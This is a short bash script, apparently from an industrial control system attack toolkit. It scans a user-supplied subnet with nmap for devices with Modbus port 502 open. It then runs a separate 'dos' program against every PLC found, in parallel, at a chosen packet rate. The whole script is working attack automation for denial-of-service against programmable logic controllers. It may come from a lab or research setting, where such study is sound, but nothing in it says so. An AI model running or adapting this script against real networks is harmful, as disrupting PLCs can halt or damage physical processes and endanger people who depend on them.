#!/bin/bash

# Prompt the user for the network address (subnet)
read -p "Enter the network address (e.g., 192.168.60.0/24): " network_address

# Extract the base network address (first three octets) from the user input
network_prefix=$(echo $network_address | cut -d'.' -f1-3)

# Prompt the user for the frequency of the attack
read -p "Enter the frequency of the attack (packets per second, e.g., 20): " attack_frequency

# Get the IP addresses of Modbus PLCs by dynamically adjusting the IP prefix
plc_ips=$(nmap -p 502 --open $network_address | grep -oP "$network_prefix\.\d+")

# Loop through each IP address and pass it to the injection_attack script in parallel
for ip in $plc_ips; do
    echo "Running attack on PLC at $ip with frequency $attack_frequency packets/sec"
    ./dos -h $ip -f $attack_frequency &
done
